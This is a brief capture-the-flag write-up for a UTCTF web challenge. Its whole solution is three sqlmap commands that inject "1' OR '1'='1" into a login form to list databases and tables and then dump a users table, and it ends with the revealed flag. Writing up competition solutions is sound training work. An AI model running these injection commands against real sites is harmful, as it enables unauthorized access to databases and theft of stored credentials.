#### Challenge:

this challenge is epic i promise, the flag is the password [link](http://web2.utctf.live:5006/)

---

#### Solution:

```bash
sqlmap -u "http://web2.utctf.live:5006/" --data "username=1' OR '1'='1&pass=*" --random-agent --level 5 --risk 3 --dbs
sqlmap -u "http://web2.utctf.live:5006/" --data "username=1' OR '1'='1&pass=*" --random-agent --level 5 --risk 3 -D public --tables
sqlmap -u "http://web2.utctf.live:5006/" --data "username=1' OR '1'='1&pass=*" --random-agent --level 5 --risk 3 -D public -T users --dump
```

---

<details><summary>FLAG:</summary>

```
utflag{dual1pa1sp3rf3ct}
```

</details>
<br/>
